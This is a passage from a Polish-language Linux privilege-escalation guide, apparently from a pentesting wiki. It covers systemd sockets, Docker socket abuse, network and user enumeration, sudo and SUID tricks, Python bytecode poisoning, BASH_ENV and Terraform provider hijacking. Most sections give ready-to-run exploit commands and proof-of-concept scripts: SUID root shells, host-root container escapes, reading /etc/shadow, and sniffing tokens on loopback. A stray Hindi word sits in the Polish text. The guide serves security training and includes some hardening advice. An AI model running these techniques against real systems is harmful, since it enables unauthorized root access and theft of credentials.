- Znaleźć jakiś systemd unit, który **uruchamia względną ścieżkę** i masz **uprawnienia do zapisu** w **systemd PATH** (aby podszyć się pod ten executable)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Enabling Timer**

Aby włączyć timer, potrzebujesz uprawnień root i wykonać:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note that the **timer** is **aktywowany** przez utworzenie dowiązania symbolicznego do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) umożliwiają **komunikację procesów** na tej samej lub różnych maszynach w modelach klient-serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji między komputerami i są konfigurowane przez pliki `.socket`.

Sockets można konfigurować za pomocą plików `.socket`.

**Dowiedz się więcej o sockets z `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje są różne, ale w skrócie służą do **określenia, gdzie socket będzie nasłuchiwał** (ścieżka pliku socket AF_UNIX, IPv4/6 i/lub numer portu do nasłuchiwania itd.)
- `Accept`: Przyjmuje argument boolowski. Jeśli **true**, dla każdego nadchodzącego połączenia uruchamiana jest **instancja usługi**, a przekazywany jest jej tylko socket połączenia. Jeśli **false**, wszystkie nasłuchujące sockety są **przekazywane do uruchomionej jednostki usługi**, a dla wszystkich połączeń uruchamiana jest tylko jedna jednostka usługi. Ta wartość jest ignorowana dla socketów datagramowych i FIFO, gdzie pojedyncza jednostka usługi bezwarunkowo obsługuje cały przychodzący ruch. **Domyślnie false**. Ze względów wydajnościowych zaleca się pisać nowe demony wyłącznie w sposób odpowiedni dla `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmuje jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** utworzeniu i zbindowaniu odpowiednio nasłuchujących **socketów**/FIFO. Pierwszy token linii poleceń musi być absolutną nazwą pliku, a potem mogą występować argumenty procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** zamknięciu i usunięciu odpowiednio nasłuchujących **socketów**/FIFO.
- `Service`: Określa nazwę jednostki **usługi** **do aktywacji** przy **nadchodzącym ruchu**. To ustawienie jest dozwolone tylko dla socketów z Accept=no. Domyślnie wskazuje usługę o tej samej nazwie co socket (z zastąpionym sufiksem). W większości przypadków użycie tej opcji nie powinno być konieczne.

### Writable .socket files

Jeśli znajdziesz **zapisywalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś takiego: `ExecStartPre=/home/kali/sys/backdoor`, a backdoor zostanie uruchomiony przed utworzeniem socketu. Dlatego **prawdopodobnie będziesz musiał poczekać, aż maszyna zostanie zrestartowana.**\
_Uwaga: system musi używać tej konfiguracji pliku socket, inaczej backdoor nie zostanie uruchomiony_

### Socket activation + writable unit path (create missing service)

Inną poważną błędną konfiguracją jest:

- jednostka socket z `Accept=no` i `Service=<name>.service`
- wskazana jednostka usługi nie istnieje
- atakujący może zapisywać w `/etc/systemd/system` (lub innej ścieżce wyszukiwania jednostek)

W takim przypadku atakujący może utworzyć `<name>.service`, a następnie wygenerować ruch do socketu, aby systemd załadował i uruchomił nową usługę jako root.

Szybki przepływ:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Zapisywalne sockety

Jeśli **zidentyfikujesz jakikolwiek zapisywalny socket** (_teraz mówimy o Unix Sockets, a nie o plikach konfiguracyjnych `.socket`_), to **możesz komunikować się** z tym socketem i być może wykorzystać podatność.

### Enumeruj Unix Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład eksploatacji:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### Sockets HTTP

Zauważ, że mogą istnieć jakieś **sockets nasłuchujące na HTTP** requesty (_nie mówię o plikach .socket, ale o plikach działających jako unix sockets_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Jeśli socket **odpowiada żądaniem HTTP**, możesz się z nim **komunikować** i być może **wykorzystać jakąś podatność**.

### Zapisowalny Docker Socket

Docker socket, często znajdujący się w `/var/run/docker.sock`, jest krytycznym plikiem, który powinien być zabezpieczony. Domyślnie może być zapisywany przez użytkownika `root` oraz członków grupy `docker`. Posiadanie uprawnień do zapisu do tego socketu może prowadzić do privilege escalation. Oto omówienie, jak można to zrobić, oraz alternatywne metody, jeśli Docker CLI nie jest dostępne.

#### **Privilege Escalation with Docker CLI**

Jeśli masz dostęp do zapisu do Docker socket, możesz wykonać privilege escalation za pomocą następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te komendy pozwalają uruchomić kontener z dostępem na poziomie root do systemu plików hosta.

#### **Using Docker API Directly**

W przypadkach, gdy Docker CLI nie jest dostępne, socket Docker nadal można manipulować za pomocą Docker API i poleceń `curl`.

1.  **List Docker Images:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Wyślij żądanie utworzenia kontenera, który montuje katalog root systemu hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Uruchom nowo utworzony kontener:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Użyj `socat`, aby nawiązać połączenie z kontenerem, umożliwiając wykonywanie w nim poleceń.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po skonfigurowaniu połączenia `socat` możesz wykonywać polecenia bezpośrednio w kontenerze z dostępem na poziomie root do systemu plików hosta.

### Others

Pamiętaj, że jeśli masz uprawnienia zapisu do socket docker, ponieważ jesteś **w grupie `docker`**, masz [**więcej sposobów na eskalację uprawnień**](interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API nasłuchuje na porcie** możesz również być w stanie je skompromitować](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **więcej sposobów na wydostanie się z kontenerów lub nadużycie runtime'ów kontenerów w celu eskalacji uprawnień** w:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Jeśli możesz użyć polecenia **`ctr`**, przeczytaj następującą stronę, ponieważ **możesz być w stanie nadużyć go do eskalacji uprawnień**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Jeśli możesz użyć polecenia **`runc`**, przeczytaj następującą stronę, ponieważ **możesz być w stanie nadużyć go do eskalacji uprawnień**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany system **inter-Process Communication (IPC)**, który umożliwia aplikacjom efektywną interakcję i współdzielenie danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidną strukturę dla różnych form komunikacji między aplikacjami.

System jest wszechstronny i obsługuje podstawowe IPC, które usprawnia wymianę danych między procesami, przypominając **rozszerzone UNIX domain sockets**. Ponadto pomaga w rozgłaszaniu zdarzeń lub sygnałów, ułatwiając płynną integrację między komponentami systemu. Na przykład sygnał z demona Bluetooth o nadchodzącym połączeniu może spowodować wyciszenie odtwarzacza muzyki, poprawiając komfort użytkownika. Dodatkowo D-Bus obsługuje zdalny system obiektów, upraszczając żądania usług i wywołania metod między aplikacjami oraz usprawniając procesy, które tradycyjnie były złożone.

D-Bus działa w modelu **allow/deny**, zarządzając uprawnieniami wiadomości (wywołania metod, emisje sygnałów itp.) na podstawie łącznego efektu pasujących reguł polityki. Te polityki określają interakcje z bus, potencjalnie umożliwiając eskalację uprawnień poprzez wykorzystanie tych uprawnień.

Przykład takiej polityki w `/etc/dbus-1/system.d/wpa_supplicant.conf` jest podany, opisując uprawnienia użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy mają zastosowanie uniwersalne, natomiast polityki kontekstu "default" dotyczą wszystkich, którzy nie są objęci innymi konkretnymi politykami.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się, jak enumerować i exploitować komunikację D-Bus tutaj:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Zawsze warto enumerować sieć i ustalić pozycję maszyny.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Szybka triage filtrowania outbound

Jeśli host może uruchamiać polecenia, ale callbacki zawodzą, szybko rozdziel DNS, transport, proxy i filtrowanie trasy:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Otwarte porty

Zawsze sprawdzaj usługi sieciowe działające na maszynie, z którymi nie mogłeś wcześniej wejść w interakcję przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Klasyfikuj nasłuchujące usługi według celu bind:

- `0.0.0.0` / `[::]`: wystawione na wszystkich lokalnych interfejsach.
- `127.0.0.1` / `::1`: tylko lokalnie (dobre kandydaty do tunnel/forward).
- Konkretne wewnętrzne IP (np. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): zwykle dostępne tylko z wewnętrznych segmentów.

### Local-only service triage workflow

Gdy przejmiesz host, usługi zbindowane do `127.0.0.1` często po raz pierwszy stają się dostępne z twojej shell. Szybki lokalny workflow to:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS jako skaner sieciowy (tryb tylko sieć)

Oprócz lokalnych checks PE, linPEAS może działać jako skoncentrowany skaner sieciowy. Używa dostępnych binariów w `$PATH` (zwykle `fping`, `ping`, `nc`, `ncat`) i nie instaluje tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Jeśli przekażesz `-d`, `-p` lub `-i` bez `-t`, linPEAS działa jak czysty skaner sieciowy (pomijając resztę testów privilege-escalation).

### Sniffing

Sprawdź, czy możesz sniffować ruch. Jeśli tak, możesz być w stanie przechwycić jakieś credentials.
```
timeout 1 tcpdump
```
Szybkie praktyczne sprawdzenia:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) jest szczególnie cenny w post-exploitation, ponieważ wiele usług dostępnych tylko wewnętrznie wystawia tam tokeny/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Przechwyć teraz, analizuj później:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Użytkownicy

### Generic Enumeration

Sprawdź, **kim** jesteś, jakie **privileges** masz, którzy **users** są w systemach, którzy mogą **login** i którzy mają **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Niektóre wersje Linux były podatne na błąd, który pozwala użytkownikom z **UID > INT_MAX** eskalować privileges. Więcej informacji: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) oraz [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Wykorzystaj to** używając: **`systemd-run -t /bin/bash`**

### Groups

Sprawdź, czy jesteś **członkiem jakiejś group**, która mogłaby dać ci root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Sprawdź, czy coś interesującego znajduje się w clipboardzie (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

Jeśli **znasz jakiekolwiek hasło** w tym środowisku, **spróbuj zalogować się jako każdy użytkownik** używając tego hasła.

### Su Brute

Jeśli nie przeszkadza Ci generowanie dużego hałasu i na komputerze są dostępne binaria `su` oraz `timeout`, możesz spróbować wykonać brute-force na użytkownikach za pomocą [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje wykonywać brute-force na użytkownikach.

## Ataki na zapisywalny PATH

### $PATH

Jeśli odkryjesz, że możesz **zapisywać do jakiegoś folderu w $PATH**, możesz być w stanie podnieść uprawnienia przez **utworzenie backdoora w zapisywalnym folderze** o nazwie jakiegoś polecenia, które zostanie wykonane przez innego użytkownika (najlepiej root) i które **nie jest ładowane z folderu znajdującego się wcześniej** niż Twój zapisywalny folder w $PATH.

### SUDO and SUID

Możesz mieć अनुमति do wykonania jakiegoś polecenia używając sudo albo może ono mieć ustawiony bit suid. Sprawdź to za pomocą:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają ci odczytywać i/lub zapisywać pliki, a nawet wykonać polecenie.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja sudo może pozwolić użytkownikowi wykonać pewne polecenie z uprawnieniami innego użytkownika bez znajomości hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchomić `vim` jako `root`, więc teraz bardzo łatwo jest uzyskać shell, dodając klucz ssh do katalogu root lub wywołując `sh`.
```
sudo vim -c '!sh'
```
### SETENV

To polecenie pozwala użytkownikowi **ustawić zmienną środowiskową** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **oparty na maszynie HTB Admirer**, był **podatny** na **PYTHONPATH hijacking**, co pozwalało załadować dowolną bibliotekę Pythona podczas uruchamiania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

Jeśli **sudo-dozwolony skrypt Pythona** importuje moduł, którego katalog pakietu zawiera **zapisywalny `__pycache__`**, możesz być w stanie podmienić buforowany plik `.pyc` i uzyskać wykonanie kodu jako uprzywilejowany użytkownik przy następnym imporcie.

- Dlaczego to działa:
- CPython przechowuje cache bajtkodu w `__pycache__/module.cpython-<ver>.pyc`.
- Interpreter weryfikuje **nagłówek** (magic + metadane timestamp/hash powiązane ze źródłem), a następnie wykonuje obiekt kodu zserializowany marshalem, zapisany za tym nagłówkiem.
- Jeśli możesz **usunąć i utworzyć ponownie** plik cache, ponieważ katalog jest zapisywalny, root-owned, ale niezapisywalny plik `.pyc` nadal może zostać podmieniony.
- Typowa ścieżka:
- `sudo -l` pokazuje skrypt Pythona albo wrapper, który możesz uruchomić jako root.
- Ten skrypt importuje lokalny moduł z `/opt/app/`, `/usr/local/lib/...`, itd.
- Katalog `__pycache__` importowanego modułu jest zapisywalny przez twojego użytkownika albo przez wszystkich.

Szybka enumeracja:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Jeśli możesz sprawdzić uprzywilejowany skrypt, zidentyfikuj zaimportowane moduły i ich ścieżkę cache:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Przepływ nadużycia:

1. Uruchom raz skrypt dozwolony przez sudo, aby Python utworzył prawidłowy plik cache, jeśli jeszcze nie istnieje.
2. Odczytaj pierwsze 16 bajtów z prawidłowego `.pyc` i użyj ich ponownie w zatrutym pliku.
3. Skompiluj obiekt kodu payload, użyj `marshal.dumps(...)`, usuń oryginalny plik cache i odtwórz go z oryginalnym nagłówkiem oraz swoim złośliwym bytecode.
4. Uruchom ponownie skrypt dozwolony przez sudo, aby import wykonał Twój payload jako root.

Ważne uwagi:

- Ponowne użycie oryginalnego nagłówka jest kluczowe, ponieważ Python sprawdza metadane cache względem pliku źródłowego, a nie to, czy treść bytecode naprawdę zgadza się ze źródłem.
- Jest to szczególnie użyteczne, gdy plik źródłowy należy do root i nie można go zapisać, ale katalog zawierający `__pycache__` jest zapisywalny.
- Atak nie powiedzie się, jeśli uprzywilejowany proces używa `PYTHONDONTWRITEBYTECODE=1`, importuje z lokalizacji o bezpiecznych uprawnieniach albo usuwa prawo zapisu do każdego katalogu w ścieżce importu.

Minimalny kształt proof-of-concept:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Upewnij się, że żaden katalog w uprzywilejowanej ścieżce importu Python nie jest zapisywalny przez użytkowników o niskich uprawnieniach, w tym `__pycache__`.
- Dla uruchomień uprzywilejowanych rozważ `PYTHONDONTWRITEBYTECODE=1` oraz okresowe sprawdzanie nieoczekiwanych zapisywalnych katalogów `__pycache__`.
- Traktuj zapisywalne lokalne moduły Python i zapisywalne katalogi cache tak samo, jak traktowałbyś zapisywalne skrypty shell lub współdzielone biblioteki wykonywane przez root.

### BASH_ENV preserved via sudo env_keep → root shell

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać nieinteraktywne zachowanie startowe Bash, aby uruchomić arbitralny kod jako root podczas wywołania dozwolonej komendy.

- Dlaczego to działa: dla nieinteraktywnych shelli Bash interpretuje `$BASH_ENV` i źródłuje ten plik przed uruchomieniem docelowego skryptu. Wiele reguł sudo pozwala uruchomić skrypt lub wrapper shell. Jeśli `BASH_ENV` jest zachowany przez sudo, Twój plik jest źródłowany z uprawnieniami root.

- Wymagania:
- Reguła sudo, którą możesz uruchomić (dowolny cel, który wywołuje `/bin/bash` nieinteraktywnie, albo dowolny skrypt bash).
- `BASH_ENV` obecny w `env_keep` (sprawdź przez `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Usuń `BASH_ENV` (i `ENV`) z `env_keep`, preferuj `env_reset`.
- Unikaj shell wrappers dla dozwolonych przez sudo komend; używaj minimal binaries.
- Rozważ sudo I/O logging i alerting, gdy używane są preserved env vars.

### Terraform via sudo z zachowanym HOME (!env_reset)

Jeśli sudo zostawia środowisko bez zmian (`!env_reset`) podczas zezwalania na `terraform apply`, `$HOME` pozostaje użytkownikiem wywołującym. Terraform ładuje wtedy **$HOME/.terraformrc** jako root i respektuje `provider_installation.dev_overrides`.

- Skieruj wymagany provider do zapisywalnego katalogu i umieść złośliwy plugin nazwany zgodnie z providerem (np. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform nie powiedzie się na handshake wtyczki Go, ale wykona payload jako root przed zakończeniem działania, pozostawiając za sobą shell SUID.

### TF_VAR overrides + symlink validation bypass

Zmienne Terraform mogą być przekazywane przez zmienne środowiskowe `TF_VAR_<name>`, które przetrwają, gdy sudo zachowa środowisko. Słabe walidacje, takie jak `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, można obejść za pomocą symlinków:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform rozwiązuje symlink i kopiuje prawdziwy `/root/root.txt` do miejsca, które może odczytać atakujący. To samo podejście można wykorzystać do **zapisu** do uprzywilejowanych ścieżek przez wcześniejsze utworzenie symlinków dla katalogu docelowego (np. wskazujących ścieżkę docelową providera wewnątrz `/etc/cron.d/`).

### requiretty / !requiretty

Na niektórych starszych dystrybucjach sudo może być skonfigurowane z `requiretty`, co wymusza uruchamianie sudo tylko z interaktywnego TTY. Jeśli ustawione jest `!requiretty` (albo opcja jest nieobecna), sudo można uruchamiać z nieinteraktywnych kontekstów, takich jak reverse shells, zadania cron lub skrypty.
```bash
Defaults !requiretty
```
To nie jest samo w sobie bezpośrednia podatność, ale rozszerza sytuacje, w których reguły sudo mogą zostać nadużyte bez potrzeby pełnego PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Jeśli `sudo -l` pokazuje `env_keep+=PATH` albo `secure_path` zawierający wpisy zapisywalne przez atakującego (np. `/home/<user>/bin`), każda względna komenda wewnątrz celu dozwolonego przez sudo może zostać podszyta.

- Wymagania: reguła sudo (często `NOPASSWD`) uruchamiająca skrypt/binarkę, która wywołuje komendy bez absolutnych ścieżek (`free`, `df`, `ps`, itp.), oraz zapisywalny wpis PATH, który jest przeszukiwany jako pierwszy.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Omijanie ścieżek w wykonywaniu Sudo
**Przejdź** do innych plików lub użyj **symlinks**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyto **wildcard** (\*), jest jeszcze łatwiej:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Jeśli **uprawnienie sudo** zostało nadane dla pojedynczego polecenia **bez podania ścieżki**: _hacker10 ALL= (root) less_ możesz to wykorzystać, zmieniając zmienną PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być również użyta, jeśli binarka **suid** **wykonuje inne polecenie bez określania ścieżki do niego (zawsze sprawdzaj za pomocą** _**strings**_ **zawartość dziwnej binarki SUID)**.

[Przykłady payloadów do wykonania.](payloads-to-execute.md)

### Binarka SUID ze ścieżką do polecenia

Jeśli binarka **suid** **wykonuje inne polecenie, podając jego ścieżkę**, wtedy możesz spróbować **wyeksportować funkcję** nazwaną tak jak polecenie, które wywołuje plik suid.

Na przykład, jeśli binarka suid wywołuje _**/usr/sbin/service apache2 start**_, musisz spróbować utworzyć funkcję i ją wyeksportować:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wtedy, gdy wywołasz binarkę SUID, ta funkcja zostanie wykonana

### Zapisywalny skrypt wykonywany przez wrapper SUID

Typowym błędem konfiguracji niestandardowej aplikacji jest należący do root binarny wrapper SUID, który wykonuje skrypt, podczas gdy sam skrypt jest zapisywalny przez użytkowników o niskich uprawnieniach.

Typowy wzorzec:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Jeśli `/usr/local/bin/backup.sh` jest zapisywalny, możesz dopisać polecenia payload, a następnie uruchomić wrapper SUID:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Szybkie sprawdzenia:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Ta ścieżka ataku jest szczególnie częsta w wrapperach „maintenance”/„backup” dostarczanych w `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

